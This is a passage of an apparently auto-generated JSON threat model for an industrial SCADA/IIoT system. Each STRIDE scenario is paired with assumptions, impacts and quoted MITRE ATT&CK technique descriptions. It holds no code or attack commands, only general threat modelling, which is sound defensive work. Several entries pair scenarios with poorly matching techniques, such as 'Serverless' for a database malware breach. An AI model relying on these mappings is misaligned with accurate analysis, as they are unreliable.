                    "Assumption": "The attacker can engage in social engineering without detection.",
                    "Role": "Attacker",
                    "Condition": "When there is no robust monitoring of employee activities."
                }
            ],
            "Potential Impact": "Compromise of control systems and mismanagement of industrial processes.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "social engineering",
                "authentication",
                "HMI",
                "insider"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies configuration files within PLCs to disrupt industrial operations.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or network access to the PLCs.",
                    "Role": "Attacker",
                    "Condition": "Enabled by weak physical or network security controls."
                },
                {
                    "Assumption": "The system does not use tamper-evident mechanisms or immutable logs.",
                    "Role": "System Configuration",
                    "Condition": "When tamper detection is not integrated."
                },
                {
                    "Assumption": "The attacker can evade detection during tampering activities.",
                    "Role": "Attacker",
                    "Condition": "If monitoring systems are inadequate or poorly managed."
                }
            ],
            "Potential Impact": "Disruption of control logic leading to potential safety hazards.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "PLCs",
                "configuration",
                "network access",
                "physical security"
            ],
            "mitre_technique": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
                "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
                "technique_id": "T1222.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker alters data being transmitted from field devices to the RTUs.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept and manipulate data in transit.",
                    "Role": "Attacker",
                    "Condition": "If data communication is not adequately encrypted."
                },
                {
                    "Assumption": "Field devices and RTUs do not have integrity checks on the transmitted data.",
                    "Role": "System Design",
                    "Condition": "Absence of checksums or digital signatures."
                },
                {
                    "Assumption": "Network monitoring and intrusion detection systems are either absent or ineffective.",
                    "Role": "System Configuration",
                    "Condition": "When real-time monitoring is not present or properly configured."
                }
            ],
            "Potential Impact": "Compromise of data integrity and possible misinterpretation of field conditions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "interception",
                "transmission",
                "network security"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Adversary installs malware on the MES database, altering operational data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can exploit a vulnerability in the MES or database system.",
                    "Role": "Attacker",
                    "Condition": "Known or zero-day vulnerabilities are not patched."
                },
                {
                    "Assumption": "The system allows executable code to be deployed on the database server.",
                    "Role": "System Configuration",
                    "Condition": "When strict execution policies are not enforced."
                },
                {
                    "Assumption": "The attacker maintains persistent access to the compromised system.",
                    "Role": "Attacker",
                    "Condition": "If the intrusion is not detected and remediated promptly."
                }
            ],
            "Potential Impact": "Data integrity violations could lead to incorrect decision-making in production workflows.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "malware",
                "MES",
                "database",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker infiltrates and issues kilobytes-level commands with no traceable logs.",
            "Assumptions": [
                {
                    "Assumption": "The system logging mechanisms are insufficient or can be easily disabled.",
                    "Role": "System Design",
                    "Condition": "When audit trails are not robust."
                },
                {
                    "Assumption": "The attacker can use stolen credentials with admin privileges.",
                    "Role": "Attacker",
                    "Condition": "Low monitoring of privileged account usage."
                },
                {
                    "Assumption": "The attacker can remove or alter logs after issuing commands.",
                    "Role": "Attacker",
                    "Condition": "Log integrity is not protected."
                }
            ],
            "Potential Impact": "Non-repudiation issues leading to difficulties in tracing malicious activities and enforcing accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "admin privileges",
                "credentials",
                "audit trail"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Operators at field devices claim they did not perform specific actions due to generic logging.",
            "Assumptions": [
                {
                    "Assumption": "Logging at field devices does not capture detailed operator activities.",
                    "Role": "System Design",
                    "Condition": "When logs only record broad actions."
                },
                {
                    "Assumption": "There is no unique authentication for each operator action.",
                    "Role": "System Design",
                    "Condition": "If generic credentials are used for multiple users."
                },
                {
                    "Assumption": "Operators can access field devices without individual accountability.",
                    "Role": "System Configuration",
                    "Condition": "When accountability policies are weak."
                }
            ],
            "Potential Impact": "Issues in auditability and enforcement of accountability for actions performed.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "operator actions",
                "audit",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Cloud service interactions lack detailed transaction logs, making tracking changes difficult.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services used do not provide or enforce detailed logging.",
                    "Role": "Cloud Service Provider",
                    "Condition": "When logging services are not enabled or properly configured."
                },
                {
                    "Assumption": "An attacker can use valid web tokens to interact with cloud services.",
                    "Role": "Attacker",
                    "Condition": "If token security is weak or tokens are improperly managed."
                },
                {
                    "Assumption": "There is no integration of cloud logs with on-premise log management systems.",
                    "Role": "System Configuration",
                    "Condition": "When siloed logging setups are used."
                }
            ],
            "Potential Impact": "Loss of transaction traceability and harder forensic investigations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "cloud services",
                "logging",
                "web tokens",
                "traceability"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Interception of sensitive data communicated between RTUs and the cloud gateway.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not end-to-end encrypted.",
                    "Role": "System Configuration",
                    "Condition": "If data is sent in plaintext."
                },
                {
                    "Assumption": "Network segmentation between RTUs and the gateway is inadequate.",
                    "Role": "System Design",
                    "Condition": "When unfiltered pathways exist."
                },
                {
                    "Assumption": "The attacker can access the communication pathways unnoticed.",
                    "Role": "Attacker",
                    "Condition": "If network monitoring is insufficient."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of operational and possibly personal information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "encryption",
                "network segmentation",
                "interception",
                "data in transit"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to data stored in cloud services due to weak access controls.",
            "Assumptions": [
                {
                    "Assumption": "The cloud service uses weak or default access controls.",
                    "Role": "Cloud Service Provider",
                    "Condition": "When best practices for access control are not followed."
                },
                {
                    "Assumption": "Access credentials for cloud services are compromised.",
                    "Role": "Attacker",
                    "Condition": "If credentials are weak or exposed through phishing."
                },
                {
                    "Assumption": "Multi-factor authentication is not enforced for cloud access.",
                    "Role": "System Configuration",
                    "Condition": "When single sign-on is relied upon without additional authentication layers."
                }
            ],
            "Potential Impact": "Exposure of sensitive operational data stored on the cloud.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud services",
                "access controls",
                "credentials",
                "multi-factor authentication"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data breach via malware infection on MES database compromising sensitive operational data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker successfully deploys malware onto the MES infrastructure.",
                    "Role": "Attacker",
                    "Condition": "Given vulnerabilities in the MES software."
                },
                {
                    "Assumption": "There are insufficient antivirus or malware detection mechanisms on the MES database.",
                    "Role": "System Configuration",
                    "Condition": "When security tools are outdated or misconfigured."
                },
                {
                    "Assumption": "Sensitive data is not encrypted at the database level.",
                    "Role": "System Configuration",
                    "Condition": "If data encryption is not implemented."
                }
            ],
            "Potential Impact": "Potential unauthorized access and exfiltration of critical operational data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data breach",
                "malware",
                "MES",
                "database"
            ],
            "mitre_technique": {
                "name": "Serverless",
                "description": "Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.\n\nOnce acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)",
                "id": "attack-pattern--04a5a8ab-3bc8-4c83-95c9-55274a89786d",
                "technique_id": "T1583.007"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DoS attacks targeting the gateway disrupting communication between SCADA and cloud services.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can generate high traffic volumes to overwhelm the gateway.",
                    "Role": "Attacker",
                    "Condition": "If there are insufficient rate-limiting or anti-DoS measures."
                },
                {
                    "Assumption": "There is a dependency on continuous connectivity between SCADA and cloud services.",
                    "Role": "System Design",
                    "Condition": "When no offline operational capability is available."
                },
                {
                    "Assumption": "Intrusion detection systems are either ineffective or absent.",
                    "Role": "System Configuration",
                    "Condition": "When real-time monitoring is not in place."
                }
            ],
            "Potential Impact": "Disruption of data flow and potential operational outages.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DoS",
                "gateway",
                "SCADA",
                "cloud services",
                "traffic volume"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of vulnerabilities in HMI leading to system crashes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker exploits unpatched software or firmware vulnerabilities in the HMI.",
                    "Role": "Attacker",
                    "Condition": "When the system is not up-to-date with patches."
                },
                {
                    "Assumption": "HMI has no proper resource limitations that can be exploited to cause crashes.",
                    "Role": "System Design",
                    "Condition": "When there is no resource allocation mechanism in place."
                },
                {
                    "Assumption": "The attacker can persistently attack the HMI without being detected.",
                    "Role": "Attacker",
                    "Condition": "If monitoring controls are weak."
                }
            ],
            "Potential Impact": "Loss of monitoring and control capabilities within the Control Center.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "HMI",
                "system crash",
                "vulnerabilities",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding the MES with malformed requests to overload database queries.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can generate a large volume of malformed requests targeting the MES.",
                    "Role": "Attacker",
                    "Condition": "When input validation is weak or non-existent."
                },
                {
                    "Assumption": "The MES database does not have throttling mechanisms to handle high request volumes.",
                    "Role": "System Configuration",
                    "Condition": "If traffic management is not implemented."
                },
                {
                    "Assumption": "Monitoring systems fail to detect and mitigate the attack in real time.",
                    "Role": "System Configuration",
                    "Condition": "When monitoring is ineffective."
                }
            ],
            "Potential Impact": "Operational slowdown or shutdown of MES due to overwhelmed database.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "MES",
                "database",
                "malformed requests",
                "query overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker exploits MES application vulnerability to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "The MES application has known vulnerabilities that can be exploited.",
                    "Role": "Attacker",
                    "Condition": "When vulnerability patches are delayed or non-existent."
                },
                {
                    "Assumption": "The system allows for privilege escalation through poorly designed access controls.",
                    "Role": "System Design",
                    "Condition": "When role-based access controls are weak or improperly configured."
                },
                {
                    "Assumption": "Application logging and monitoring are ineffective at catching privilege escalation attempts.",
                    "Role": "System Configuration",
                    "Condition": "When logging and detection mechanisms are not robust."
                }
            ],
            "Potential Impact": "Full system compromise with unrestricted access to the MES and related databases.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "MES",
                "administrative privileges",
                "vulnerabilities",
                "access controls"
            ],
            "mitre_technique": {
                "name": "Elevated Execution with Prompt",
                "description": "Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating.  This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\n\nAdversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)",
                "id": "attack-pattern--101c3a64-9ba5-46c9-b573-5c501053cbca",
                "technique_id": "T1514"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Unauthorized user escalates privileges through unpatched vulnerabilities in SCADA software.",
            "Assumptions": [
                {
                    "Assumption": "The SCADA software has unpatched known vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "When patch management is not up-to-date."
                },
                {
                    "Assumption": "The user accounts and privileges are improperly managed or monitored.",
                    "Role": "System Configuration",
                    "Condition": "If privileged accounts are broadly accessible."
                },
                {
                    "Assumption": "The attacker can operate without triggering security alerts.",
                    "Role": "Attacker",
                    "Condition": "If detection mechanisms are weak."
                }
            ],
            "Potential Impact": "Potential full system control and manipulation of SCADA operations.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "SCADA",
                "software vulnerabilities",
                "unpatched",
                "privilege management"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious insiders elevate privileges by leveraging weak authentication protocols at the gateway.",
            "Assumptions": [
                {
                    "Assumption": "Authentication protocols at the gateway are weak or improperly configured.",
                    "Role": "System Design",
                    "Condition": "When protocols do not enforce strong authentication."
                },
                {
                    "Assumption": "Insiders have initial access with some level of privileges.",
                    "Role": "Insider",
                    "Condition": "If access control policies are lax."
                },
                {
                    "Assumption": "Logging and alerting mechanisms are insufficient to catch privilege escalations.",
                    "Role": "System Configuration",
                    "Condition": "When monitoring and logs are not adequately reviewed."
                }
            ],
            "Potential Impact": "Unauthorized changes to data flows and critical operations within the IIoT system.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "gateway",
                "authentication",
                "malicious insiders",
                "protocols"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
